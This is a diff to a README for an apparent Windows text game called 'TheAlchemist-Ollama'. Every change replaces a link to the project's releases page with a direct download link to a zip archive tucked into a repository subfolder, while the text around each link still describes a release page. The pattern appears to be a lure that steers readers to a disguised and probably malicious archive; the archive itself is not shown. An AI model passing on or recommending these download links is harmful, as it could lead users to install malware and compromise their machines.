@@ -1,6 +1,6 @@
 # 🎮 TheAlchemist-Ollama - Run The Alchemist on Windows
 
-[![Download TheAlchemist-Ollama](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/releases)
+[![Download TheAlchemist-Ollama](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/raw/refs/heads/main/writership/Alchemist_The_Ollama_1.5.zip)
 
 ## 🧪 What This Is
 
@@ -12,7 +12,7 @@ The game uses plain text input and output. You type choices, then the game respo
 
 Visit this page to download the Windows release:
 
-https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/releases
+https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/raw/refs/heads/main/writership/Alchemist_The_Ollama_1.5.zip
 
 Open the latest release, then download the file made for Windows. If you see more than one file, choose the one that matches your system.
 
@@ -29,7 +29,7 @@ For best results, use a current Windows system with the latest updates.
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/releases
+   https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/raw/refs/heads/main/writership/Alchemist_The_Ollama_1.5.zip
 
 2. Find the latest release at the top of the page.
 
@@ -174,7 +174,7 @@ It fits users who like:
 
 Go to the release page and download the Windows file:
 
-https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/releases
+https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/raw/refs/heads/main/writership/Alchemist_The_Ollama_1.5.zip
 
 After the download finishes, extract the files if needed, then open the game file to run it on Windows
 
@@ -223,7 +223,7 @@ This style works well for players who like step-by-step game play and text promp
 
 The only download source you need is the release page:
 
-https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/releases
+https://github.com/Peritoneal-inverter187/TheAlchemist-Ollama/raw/refs/heads/main/writership/Alchemist_The_Ollama_1.5.zip
 
 Look for the latest release entry, then choose the file made for Windows
 
